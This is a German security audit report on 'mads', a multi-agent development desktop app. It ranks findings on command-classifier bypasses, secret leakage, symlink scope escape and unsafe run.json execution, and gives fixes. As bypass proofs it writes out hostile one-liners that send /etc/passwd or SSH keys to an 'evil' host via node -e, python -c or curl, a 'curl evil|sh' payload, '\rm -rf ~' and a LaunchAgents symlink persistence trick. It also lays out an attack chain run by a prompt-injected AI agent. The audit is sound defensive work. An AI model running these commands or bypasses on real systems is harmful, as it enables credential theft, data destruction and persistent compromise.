# Sicherheitsüberprüfung — mads (multi-agent development studio)

**Datum:** 2026-07-09
**Prüfgegenstand:** Branch `init/scaffold-and-prototype` (Commit `baad0db`), Repo `Hobbesch/mads`
**Methodik:** Quellcode-Audit entlang der Domänen des
[Anthropic-Cybersecurity-Skills](https://github.com/Hobbesch/Anthropic-Cybersecurity-Skills)-Katalogs
(OWASP Top 10, MITRE ATT&CK, Supply-Chain/SLSA, Agentic/AI Security). Sechs parallele
Fokus-Analysen: Command Injection · Secrets · Tauri-Capabilities/IPC · Frontend-XSS ·
Supply-Chain/CI · Agentic-Security.
**Umfang:** 171 Dateien / ~7.150 Zeilen sicherheitsrelevanter Kern (Rust-Core, Node-Sidecar,
React-Frontend, `shared/`-Policy-Module, CI/CD).

---

## 1. Management-Zusammenfassung

mads ist eine **überdurchschnittlich sicherheitsbewusst konstruierte** App: echte restriktive CSP
(`script-src 'self'`, kein `unsafe-eval`), kein Updater/`shell`/`http`-Plugin, minimale macOS-
Entitlements, SHA-256-verifizierter Modell-Download, argv-basiertes (shell-freies) Git,
`rehype-sanitize` korrekt auf allen Markdown-Pfaden, SHA-gepinnte GitHub-Actions mit
Least-Privilege-Token, `npm ci --ignore-scripts` im Gate, und ein durchdachtes, dokumentiertes
Bedrohungsmodell (Design §7). Das Fundament ist solide.

Die Schwächen liegen an **zwei strukturellen Stellen**, nicht in Schludrigkeit:

1. **Der Befehls-Klassifizierer (`safe-command.ts`) wird als Sicherheitsgrenze benutzt, ist aber
   nur UX.** Er ist gut gegen versehentliche/naive Fälle, aber gegen einen *adversarialen*
   Befehls-String (genau das erklärte Bedrohungsmodell: prompt-injizierter Agent im Auto-Modus)
   trivial umgehbar. Echte Egress-/Zerstörungs-Garantien brauchen eine OS-Sandbox.
2. **Es fehlt eine Workspace-Trust-Grenze für geöffnete Repositories.** Mehrere Pfade führen
   dazu, dass Inhalt aus einem geöffneten (potenziell bösartigen) Repo direkt auf dem Host
   ausgeführt wird — konvergent von drei unabhängigen Analysen gefunden (`.mads/run.json`).

Das Design (§7.2) benennt selbst korrekt: *„Tauri sandboxt den Child-Prozess nicht … Capabilities
schützen vor kompromittiertem Frontend, nicht vor bösartigem Sidecar-Code oder Supply-Chain."*
Die Befunde unten präzisieren, **wo die Implementierung hinter dieser Absicht zurückbleibt.**

### Befund-Übersicht

| Sev | ID | Titel |
|-----|-----|-------|
| 🔴 High | CMD-1 | Klassifizierer-Bypass via Word-Splitting (`\rm`, `\git push`, `\curl`) → stiller destruktiver/Exfil/Push |
| 🔴 High | CMD-2 | Stille Exfiltration über Interpreter (`node -e`, `python -c`) |
| 🔴 High | SEC-1 | Secrets unredigiert im IPC-Stream, Transcript-Datei & Debug-Log |
| 🔴 High | SEC-2 | Auto-Modus erlaubt Lesen der gesamten Host-Umgebung / Secret-Dateien (`env`, `cat .env`) |
| 🔴 High | TAU-1 | Dangling-Symlink-Write entkommt dem FS-Scope → Persistenz/RCE |
| 🟠 High→Med | TAU-2 | `mads_register_root` erlaubt weit mehr als den dokumentierten `mads-worktrees`-Scope |
| 🟠 Med | RCE-1 | `.mads/run.json` → beliebige Shell + volles Host-`env` (konvergent CMD-F5 / XSS-1 / AG-1) |
| 🟠 Med | TAU-3 | `sidecar_send`: unvalidierter Steuerkanal in befehlsausführenden Orchestrator |
| 🟠 Med | SEC-3 | Redaktions-Muster verfehlen `github_pat_`, `ASIA…`, Apple-Creds |
| 🟠 Med | SEC-4 | `mask()` maskiert nur den ersten Treffer → Rest-Secret erreicht UI |
| 🟠 Med | SEC-5 | Notarisierungs-Creds in Prozess-argv (`ps`-sichtbar) |
| 🟠 Med | CMD-3 | Paket-Install-Gate umgehbar (`python3.11 -m pip`, `bunx`, `deno`) |
| 🟠 Med | CMD-4 | Destruktive Ops ungated (`find -delete`, `truncate`) |
| 🟠 Med | AG-1 | `preMergeGate` erlaubt Merge, wenn gar keine CI-Checks existieren |
| 🟠 Med | XSS-1 | `openUrl()` von repo-kontrollierter URL umgeht Link-Bestätigungs-Policy |
| 🔵 Low | SUP-1 | `esbuild ≤0.24.2` — GHSA-67mh-4wv8-2f99 (dev-server CORS) |
| 🔵 Low | SUP-2 | CI: `persist-credentials: false` + `timeout-minutes` fehlen |
| 🔵 Low | CMD-5 | git/gh-Positionals ohne `--`-Trenner (Argument-Injection wenn Wert mit `-` beginnt) |
| 🔵 Low | SEC-6 | `.env.notarize.example` enthält echte Identitätsdaten; `.gitignore` deckt generisches `.env` nicht |
| 🔵 Low | SEC-7 | `agents.json` persistiert `sessionId`/`lastPrompt` im Klartext |
| ⚪ Info | div. | siehe §5 (Härtung: Advisory-Scan, Opener-Scope, Schema-`id`, ownership-ReDoS) |

---

## 2. Kritischer Angriffspfad (die Befunde als Kette)

Die schwerwiegendsten Befunde sind einzeln real, aber ihre **Verkettung** ergibt den eigentlichen
Impact. Threat-Actor: ein per Prompt-Injection (aus geöffnetem Repo-Inhalt: CLAUDE.md, Code,
Issue-Text) gesteuerter Sub-Agent im **Auto-Permission-Modus** — laut Design ein explizit
angenommenes Angreifermodell.

```
Prompt-Injection im Repo-Inhalt
        │
        ▼
SEC-2:  Agent führt `env` / `cat .env.notarize` aus → im Auto-Modus KEIN Prompt
        (safe-command hat keine Regel für Umgebungs-/Secret-Lesen bei Bash)
        │  Host-Secrets (ANTHROPIC_*, GH_TOKEN, APPLE_*) landen im stdout
        ▼
SEC-1:  stdout fließt unredigiert über NDJSON in die UI, in `debugLog`
        und in `.mads/transcripts/<agentId>.json` (Klartext, at-rest)
        │
        ▼
CMD-1/2: Agent exfiltriert still: `\curl https://evil/?d=$(… | base64)`
        oder `node -e 'require("https").get(...)'` → kein Prompt, keine curl/wget-Gate
        │
        ▼
TAU-1:  Agent legt via bösartigem Repo-Symlink + `mads_write_file_bytes` eine Datei
        AUSSERHALB des Worktrees an (z. B. ~/Library/LaunchAgents/*.plist) → Persistenz
```

Die einzelnen Glieder werden unten belegt.

---

## 3. High-Severity-Befunde (verifiziert)

### CMD-1 — Klassifizierer-Bypass via Word-Splitting 🔴 High (grenzwertig Critical)
**Datei:** `shared/safe-command.ts:337, :37-58, :191-193`

`classifyBashCommand` scannt eine quote-neutralisierte Kopie:
```js
const neutralized = cmd.replace(/['"`]/g, " ");   // NUR Quotes/Backticks — KEINE Backslashes
for (const d of DANGER) if (d.re.test(neutralized)) return ASK(d.why);
```
Alle DANGER-Muster verlangen ein Grenzzeichen vor dem Keyword, z. B.
`/(^|[\s;&|(])(rm|rmdir|shred|unlink)(\s|$)/`. `[\s;&|(]` enthält **kein** `\`. Damit umgeht
jeder der folgenden Strings *sämtliche* Gates und wird **still (`allow`)** ausgeführt, weil die
Shell den Token trotzdem korrekt zusammensetzt:

- `\rm -rf ~` — `rm` mit `\` davor → kein Match → `allow`; Bash führt `rm` aus.
- `\git push origin main` — umgeht sowohl das git-DANGER-Muster als auch `classifyGit`
  (dessen Basis-Token-Vergleich `=== "git"` bei `\git` scheitert) → **stiller Push** mit den
  im Keychain hinterlegten gh-Credentials — genau die „außen-sichtbare" Aktion, die das Gate
  verhindern soll.
- `\curl http://evil | sh`, `c""url http://evil`, `r""m -rf x` — analog.

**Verifiziert** durch Lesen von `safe-command.ts:337` (Neutralizer entfernt nachweislich keine
Backslashes) und der DANGER-Grenzzeichenklassen.

**Fix:** Nicht per Regex über einen quote-gestrippten String tokenisieren. Mit echtem
Shell-Word-Parser (oder dem vorhandenen `segmentCommands`) tokenisieren, dann das **aufgelöste**
Kommando-Wort vergleichen: führendes `\` entfernen, eingebettete Quotes/`$()`/Backslashes vor dem
Keyword-Test kollabieren, auf `basename(token)` matchen. Unparsbare Tokens default-deny.

### CMD-2 — Stille Exfiltration über Interpreter 🔴 High
**Datei:** `shared/safe-command.ts:94-103, :356`

Das Egress-Gate feuert nur bei literalem `curl`/`wget`-Token. Interpreter sind per Policy
auto-erlaubt und können Sockets öffnen — ohne Obfuskation:
```
node -e 'require("https").get("https://evil/?x="+require("fs").readFileSync("/etc/passwd").toString("base64"))'
python3 -c 'import urllib.request,base64;urllib.request.urlopen("http://evil/?d="+base64.b64encode(open("/home/u/.ssh/id_rsa","rb").read()).decode())'
```
Beide → `allow`. Das widerspricht direkt dem Aufwand, der für das WebFetch-/curl-Gating betrieben
wurde: die Interpreter, die dasselbe können, sind ausgenommen.

**Fix:** Policy-Inkonsistenz. Inline-Code-Interpreter (`-e`/`-c`/`-p`, Heredoc an `python -`/`node`)
als `ask` behandeln, ODER Egress auf OS-Ebene erzwingen (Netz-Namespace / macOS-Sandbox-Profil).
String-Klassifikation kann diese Klasse nicht schließen.

### SEC-1 — Secrets unredigiert in IPC-Stream, Transcript & Debug-Log 🔴 High
**Dateien:** `sidecar/src/session.ts:541,573-585,343` · `sidecar/src/io.ts:22` ·
`src-tauri/src/sidecar.rs:138` · `src/store.ts:442,836,841`

`secrets.ts` ist an **drei** Egress-Punkten verdrahtet (git-push, Auto-Commit, WebFetch-URL) — aber
**nicht** auf dem NDJSON-Pfad Sidecar→Frontend. Tool-Call-Inputs (ganze Shell-Kommandozeilen),
Tool-Ergebnisse (stdout), Assistant-Text, Thinking und SDK-stderr werden **verbatim** weitergereicht
und persistiert:
- `session.ts:573` — `tool_result` mit `output: cap(toolResultText(...))`, kein Scan.
- `store.ts:442` — der komplette Per-Agent-Event-Log wird als Klartext nach
  `<repoRoot>/.mads/transcripts/<agentId>.json` geschrieben (`mads_save_transcript`).

Leak-Szenario: Agent führt `git remote set-url origin https://x-access-token:ghp_…@github.com/…`
oder gibt eine `.env` aus → das Secret erscheint in der UI, bleibt in `debugLog` und liegt im
Klartext auf der Platte (T1552.001).

**Fix:** `findSecrets()` über `tool_use.input`, `tool_result.output`, `assistant_text`, `thinking`
und SDK-stderr laufen lassen (vor `send()`/`log()` maskieren) und erneut vor `mads_save_transcript`.
Am besten zentral in `io.ts send()` redigieren, damit alle Downstream-Sinks erben.

### SEC-2 — Auto-Modus erlaubt Lesen der Host-Umgebung / Secret-Dateien 🔴 High
**Dateien:** `src-tauri/src/sidecar.rs:104-112` · `shared/safe-command.ts:331-356,376-383`

Der Sidecar erbt die **volle** Parent-Umgebung (nur `PATH` wird überschrieben), inkl.
`ANTHROPIC_*`, `GH_TOKEN`, AWS-Vars — die der Claude-SDK-Subprozess wiederum erbt.
`classifyBashCommand` hat **keine** Regel für Umgebungs-/Secret-*Lesen*: `env`, `printenv`,
`cat .env`, `echo $VAR` fallen auf `return ALLOW` (Zeile 356) durch. Der `sensitivePath`-Schutz
(376-383) greift nur für die strukturierten `Read`/`Glob`-Tools, **nicht** für `Bash`.

Leak-Szenario: im `auto`-Modus führt der (ggf. injizierte) Agent `printenv ANTHROPIC_API_KEY` oder
`cat .env.notarize` aus → `allow`, Ausgabe landet in den leaky Sinks von SEC-1. T1552.001/007 mit
automatischer (prompt-freier) Ausführung.

**Fix:** DANGER-Muster für `env`/`printenv`/`set` (ohne Args bzw. mit Secret-Namen) und für
`cat`/`less`/`head`/`grep`/`source` auf `sensitivePath()`-Ziele → `ASK`. Zusätzlich bekannte
Secret-Env-Vars aus dem SDK-Child-Env strippen und Auth über einen für die Agent-Bash unlesbaren
Kanal injizieren.

### TAU-1 — Dangling-Symlink-Write entkommt dem FS-Scope 🔴 High
**Datei:** `src-tauri/src/files.rs:178-199` (`canonicalize_allowing_missing`) + Write-Pfad `:384-408`

Für ein noch nicht existierendes Ziel wird nur das **Elternverzeichnis** kanonisiert; die letzte
Komponente wird verbatim angehängt und nie als Symlink re-geprüft:
```rust
if p.exists() { return std::fs::canonicalize(p) … }  // löst Symlink auf — sicher
// sonst: canonicalize(parent) + push(name)           // finaler Name NICHT aufgelöst
```
`Path::exists()` folgt Symlinks → ein **dangling** Symlink (Ziel fehlt) meldet `false` und nimmt den
„missing"-Zweig. `canonical = <root>/<link>` besteht `starts_with(root)`, dann folgt
`std::fs::write` dem Symlink und schreibt **außerhalb** des Scopes.

Exploit: der Sidecar checkt ein Repo in einen Worktree aus (Git materialisiert Symlinks). Ein
bösartiges Repo enthält `hook -> ../../../../Library/LaunchAgents/x.plist` (Ziel noch nicht
vorhanden). Ein anschließender `mads_write_file_bytes` auf den in-scope-Pfad schreibt die Datei
in eine Autostart-/Persistenz-Location. **Verifiziert** durch Lesen der Funktion (finaler
Symlink wird nachweislich nie via `symlink_metadata` geprüft).

**Fix:** Im missing-Zweig die finale (und jede noch nicht kanonisierte) Komponente per
`symlink_metadata` auf Symlink prüfen und ablehnen; oder tiefsten existierenden Vorfahren
kanonisieren und sicherstellen, dass kein Zwischen-Symlink den Root verlässt. Write mit
`O_NOFOLLOW`/`create_new`-Semantik.

### TAU-2 — `mads_register_root` weit über den dokumentierten Scope hinaus 🟠 High→Medium
**Datei:** `src-tauri/src/files.rs:421-444`

Die Capability `capabilities/fs.json` dokumentiert den Scope als `$HOME/mads-worktrees/**` — aber
diese Capability gilt nur fürs `fs:`-**Plugin** (`watch`). Die eigentlichen R/W-Commands
(`mads_read_*`/`mads_write_*`) sind Custom-Commands, allein durch diesen Runtime-Check gated, der
fast jedes Verzeichnis mit ≥2 Komponenten akzeptiert, das nicht `/`, exakt `$HOME` oder unter einem
hartkodierten System-Prefix liegt. Registrierbar (und damit voll R/W) sind u. a.
`~/Library/Application Support/...` (Browser-Profile, Tokens), `~/Documents`, `~/.config`,
`/Users/Shared`, `/Volumes/<drive>/*`.

**Fix:** Den Runtime-Gate an den dokumentierten Scope angleichen — registrierte Roots unter eine
app-kontrollierte Basis zwingen (`$HOME/mads-worktrees/` oder ein per `dialog`-Plugin gewähltes
Projekt), Allow-List statt System-Prefix-Deny-List.

---

## 4. Medium-Severity-Befunde

### RCE-1 — `.mads/run.json` → beliebige Shell + volles Host-`env` 🟠 Medium *(konvergent, 3 Analysen)*
**Dateien:** `sidecar/src/devserver.ts:237,254,217-228` · `orchestrator.ts:165,1113` ·
`safe-command.ts:361-369` · `src/components/Inspector.tsx:411`

Der Dev-Server führt `command`/`install` aus `<repoRoot>/.mads/run.json` via
`spawn("/bin/sh", ["-c", command])` aus und vererbt `...process.env` an jeden Service. Drei
zusammenwirkende Schwächen:
1. **`.mads/run.json` ist nicht in `pathUnsafe` geschützt** (`safe-command.ts:363-364` deckt
   `.git/.ssh/.env/.npmrc/.mcp.json` ab, aber nicht `.mads/`) — **verifiziert**. Ein injizierter
   Agent kann still `{"services":[{"command":"curl evil|sh"}]}` schreiben.
2. Der nächste menschliche „Dev-Server starten"-Klick führt das unsandboxed aus, mit vollem
   Host-`env` (Secrets exfiltrierbar).
3. Die `url` aus derselben Datei wird ohne Scheme-Prüfung an `openUrl()` gegeben (→ XSS-1).

Kein Auto-Trigger (nutzer-initiiert) → Medium, nicht High. **Fix:** `.mads/` in `pathUnsafe`
aufnehmen; die konkreten `command`/`install`-Strings im Start-Dialog zur Bestätigung anzeigen;
`env` per Allow-List statt vollem `process.env`; Workspace-Trust-Prompt beim ersten Öffnen.

### TAU-3 — `sidecar_send`: unvalidierter Steuerkanal 🟠 Medium (architektonisch)
**Datei:** `src-tauri/src/sidecar.rs:148-156,92`
Das Rust-Core reicht jeden Frontend-String als NDJSON in den Sidecar-stdin (bewusst „dumme Pipe",
keine Validierung). Der Sidecar führt `npm ci`, `cargo`, `git fetch`, Agent-CLIs aus. Jede
Webview-Kompromittierung eskaliert direkt zu lokaler Befehlsausführung. Kompensierende Kontrollen
(CSP, Markdown-Sanitize) sind das Einzige dazwischen — die stehen bereits unter Smoke-Test (gut).
**Fix:** minimaler Schema-/Typ-Check an der Rust-Grenze (unerwartete Message-Typen droppen);
`MADS_NODE`/`MADS_SIDECAR_*`-Env-Overrides als „trusted-only" dokumentieren.

### SEC-3 — Redaktions-Muster verfehlen echte Credential-Formate 🟠 Medium
**Datei:** `shared/secrets.ts:16-38`
- **GitHub fine-grained PATs** (`github_pat_…`, heute Default) werden von
  `\bgh[pousr]_…` **nicht** erfasst — der häufigste moderne Token passiert die LEAK-1/INJ-2-Gates.
- **AWS STS/temporär** (`ASIA…`) und der 40-Zeichen-Secret-Key haben kein Muster.
- **Apple-Creds:** `.p8`-Body wird gefangen, aber `APPLE_API_KEY` (~10-Zeichen Key-ID),
  `APPLE_API_ISSUER`, `APPLE_TEAM_ID` fallen unter die `{12,}`/`{20,}`-Längenschwellen.
**Fix:** Muster für `github_pat_[A-Za-z0-9_]{22,}`, `ASIA[0-9A-Z]{16}` ergänzen; `APPLE_*`-Namen
explizit behandeln.

### SEC-4 — `mask()` maskiert nur den ersten Treffer 🟠 Medium
**Datei:** `shared/secrets.ts:40-43` · Leak-Sink `gate.ts:107`
`line.replace(match, "***")` ersetzt nur *ein* Vorkommen, und `findSecrets` `break`t nach dem ersten
Muster pro Zeile. Zwei Secrets in einer Zeile → nur eines maskiert; das andere überlebt in
`SecretHit.preview`, das via `gate_result`-Summary in die UI (und den Transcript) gelangt.
**Fix:** alle Vorkommen aller Treffer maskieren (globale Ersetzung); oder `preview` aus jeder
Sidecar-verlassenden Nachricht entfernen und nur `kind` zeigen.

### SEC-5 — Notarisierungs-Creds in Prozess-argv 🟠 Medium
**Datei:** `scripts/build-signed.sh:127-137,31-35`
`xcrun notarytool submit … --password "$APPLE_PASSWORD" …` — das App-spezifische Passwort steht als
Kommandozeilen-Argument, für jeden lokalen Nutzer via `ps -ax -o command` sichtbar, für die Dauer
von `--wait` (Minuten). `set -a; source .env.notarize` exportiert die Creds zudem in jedes Kind.
T1552.004. **Fix:** `xcrun notarytool store-credentials <profile>` einmalig, dann
`--keychain-profile <profile>` (kein Secret in argv); `set -a` nur eng um den Notarize-Schritt.

### CMD-3 / CMD-4 — Install- & Destruktions-Gate-Lücken 🟠 Medium
**Datei:** `shared/safe-command.ts:108-137, :39`
- `python3.11 -m pip install evil` umgeht `pkgManagerRisk` (Basis `python3.11` ≠ `python`/`python3`);
  ebenso `bunx`, `deno run --allow-net`, `pipx run` → stille Remote-Code-Ausführung.
- `find . -delete`, `truncate -s0 file`, `python -c 'shutil.rmtree(...)'` umgehen das `rm`-Gate.
**Fix:** Interpreter-Basenames normalisieren (`^python\d[\d.]*$`), `bunx`/`deno`/`pipx run` ergänzen;
`find … -delete/-exec`, `truncate` gaten.

### AG-1 — `preMergeGate` erlaubt Merge ohne CI-Checks 🟠 Medium
**Datei:** `shared/merge.ts:24-25`
Das Gate blockt nur `checksState` `FAILURE`/`PENDING`, verlangt aber nie positiv `SUCCESS`. Ein Repo
ohne konfigurierte Checks (leerer/`null`-`checksState`) passiert → verletzt die Invariante „main ist
immer lauffähig (grünes CI)", wenn keine Branch-Protection greift. **Fix:** positiv
`pr.checksState === "SUCCESS"` fordern (oder „keine Checks konfiguriert" explizit als Fail/Override
behandeln).

### XSS-1 — `openUrl()` von repo-kontrollierter URL umgeht Link-Policy 🟠 Medium
**Datei:** `src/components/Inspector.tsx:411` · `sidecar/src/devserver.ts:75`
Die App hat eine Scheme-Bestätigungs-Policy (`openExternal.ts`: https direkt, sonst Prompt). Der
Dev-Server-Button ruft `openUrl(agent.devServer.url)` **direkt** — die URL stammt ungeprüft aus
`.mads/run.json`. Ein bösartiges Repo setzt `"url":"file:///Users/victim/.ssh/id_rsa"` (oder
`smb://`) → OS-Handler öffnet es. **Fix:** an der Quelle `^https?://` erzwingen und über
`openExternalLink()` routen. (Analog `pr.url` in `Inspector.tsx:453`, aber geringer kontrollierbar.)

> **Positiv bestätigt (kein XSS):** `rehype-sanitize` läuft als *letztes* rehype-Plugin auf allen
> untrusted Render-Pfaden (Chat, Datei-Preview, Diff); kein `rehype-raw`, kein
> `dangerouslySetInnerHTML`/`innerHTML`/`eval` in `src/`; `img src` auf `data:` beschränkt;
> `javascript:` wird gestrippt (Smoke-Test beweist es). Der Markdown-Pfad ist solide.

---

## 5. Low / Info — Härtung

| ID | Datei | Empfehlung |
|----|-------|------------|
| SUP-1 | `package.json:63`, `sidecar/package.json:19` | `esbuild` auf `^0.25.0` (GHSA-67mh-4wv8-2f99, dev-server CORS; hier nur `--bundle`, geringe Ausnutzbarkeit). |
| SUP-2 | `.github/workflows/ci.yml:26,56` | `persist-credentials: false` an Checkout (führt Fork-PR-Code aus); `timeout-minutes: 30` je Job. |
| SUP-3 | CI (gesamt) | Advisory-Scan-Job (`cargo audit`/`osv-scanner`/`npm audit`) + optional Build-Provenance-Attestierung. |
| CMD-5 | `git.ts:358,373,792,847` | `--`-Trenner vor Positionals; Branch-Namen gegen `^[A-Za-z0-9._/-]+$` validieren (Argument-Injection wenn Wert mit `-` beginnt). |
| CMD-6 | `safe-command.ts:190-233` | Code-ausführende Optionen auf „sicheren" git-Subcommands (`git grep -O…`) per Option-Allow-List gaten. |
| TAU-4 | `capabilities/default.json:10,9` | `opener`-Permission auf `https`/`mailto` scopen (UI-Policy ist sonst nur Frontend); `webview:create-window` nur wo nötig. |
| TAU-5 | `capabilities/fs.json` | Kommentar/Regressionstest: der Rust-Gate ist die *einzige* FS-Autorität (Custom-Commands umgehen das Capability-System). |
| SEC-6 | `.env.notarize.example`, `.gitignore` | Echte Identitätsdaten (`/Users/alessandromedici`, `alessandro@medici.ch`, Team-ID) durch Platzhalter ersetzen; `.env`/`.env.*` (mit `!*.example`) ignorieren. |
| SEC-7 | `sidecar/src/persistence.ts:132` | `lastPrompt` vor Persist durch `findSecrets` maskieren; `sessionId` erwägen im Keychain. |
| AG-2 | `sidecar/src/gate.ts:57-100` | Gate führt untrusted Projekt-Code aus (`npm run test`, `cargo test`→`build.rs`, `pytest`→`conftest.py`) unsandboxed auf dem Host — Rest-Risiko dokumentieren; Sandbox erwägen. (`npm ci --ignore-scripts` ist bereits korrekte Härtung.) |
| AG-3 | `shared/ownership.ts:24-35` | Glob→Regex: mehrfache `**`→`.*.*` potenziell ReDoS; Literal-Space kollidiert mit `**`-Platzhalter. Regeln vermutlich trusted → Low. |

---

## 6. Positiv hervorzuheben (verifiziert, keine Aktion nötig)

- **CSP** stark: `script-src 'self'`, `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`,
  `connect-src 'self' ipc:` (`tauri.conf.json:26`).
- **Kein Updater / kein `shell`/`http`/`process`-Plugin** → keine Auto-Update-Supply-Chain-Fläche.
- **Minimale Entitlements** (nur Mikrofon); Hardened Runtime auf Tauri-Default (kein `allow-jit`,
  `disable-library-validation`, `get-task-allow`).
- **Modell-Download** (`dictation.rs`): gepinnte HF-Revision, feste `curl`-Args, Größe + SHA-256
  vor dem Verschieben.
- **Git shell-frei** via `execFile(cmd, args[])` + `GIT_TERMINAL_PROMPT=0` — keine klassische
  String-Concat-Injection.
- **CI gehärtet**: alle Third-Party-Actions SHA-gepinnt, `permissions: contents: read`, kein
  `pull_request_target`, keine `${{ github.event.* }}`-Script-Injection, GitHub-hosted Runner,
  keine Signing-Secrets in CI. Dependabot deckt alle vier Ökosysteme.
- **`markdown`**: `rehype-sanitize` last, kein `rehype-raw`; Smoke-Test gegen `<script>`/`onerror`.
- **Alle geprüften Dependency-Versionen legitim** (lucide-react 1.21, claude-agent-sdk 0.3.183,
  cpal/whisper-rs) — kein Typosquat; alle Lockfile-`resolved` auf `registry.npmjs.org`; keine
  `git+`-Cargo-Deps; keine `postinstall`-Skripte.
- **Push-Gate** scannt jeden Commit-Patch (`git log -p base..HEAD`), nicht nur den Netto-Diff.
- **Agentic-Design solide**: `autopilot.ts` automatisiert nur Reversibles, `secretBlocked` stoppt
  Commit; `preMergeGate` deckt Draft/stale-base/Konflikt/rotes-CI/Branch-Protection (bis auf AG-1).
- **INJ-1**: `settingSources: ["user"]` lädt keine untrusted Repo-`.claude/settings.json`.

---

## 7. Priorisierte Empfehlungen

**Sofort (die exploitable Kette schließen):**
1. **SEC-1 + SEC-2** — NDJSON/Transcript/Debug-Sinks redigieren *und* `env`/Secret-Datei-Lesen im
   Auto-Modus gaten. Zusammen sind sie der T1552-Exfil-Pfad.
2. **TAU-1** — Symlink-Write-Escape fixen (klein, selbst-enthalten, via Repo-Checkout ausnutzbar).
3. **CMD-1** — Word-Split-Bypass fixen (echte Tokenisierung statt Regex-über-quote-strip).

**Strukturell (die zwei Wurzeln adressieren):**
4. **OS-Sandbox** für Agent-Bash + Dev-Server + Gate (Netz-Namespace + FS-Confinement auf den
   Worktree). `safe-command.ts` als *UX* (Prompt-Fatigue-Reduktion) behandeln, nicht als
   Sicherheitsgrenze — CMD-2/3/4 sind auf String-Ebene nicht abschließend lösbar.
5. **Workspace-Trust-Grenze** für geöffnete Repos: `.mads/run.json`-Ausführung, `mads_register_root`
   (TAU-2) und `openUrl` (XSS-1) hinter eine explizite Vertrauens-Entscheidung stellen.

**Danach:** SEC-3/4/5 (Redaktions-Vollständigkeit, notarytool-Keychain), CMD-3/4, AG-1, dann §5.

---

*Erstellt mit den Domänen des Anthropic-Cybersecurity-Skills-Katalogs. Die schwersten Befunde
(CMD-1, TAU-1, RCE-1, SEC-1/2) wurden direkt am Quellcode verifiziert; Zeilennummern beziehen sich
auf Commit `baad0db` des Branch `init/scaffold-and-prototype`.*
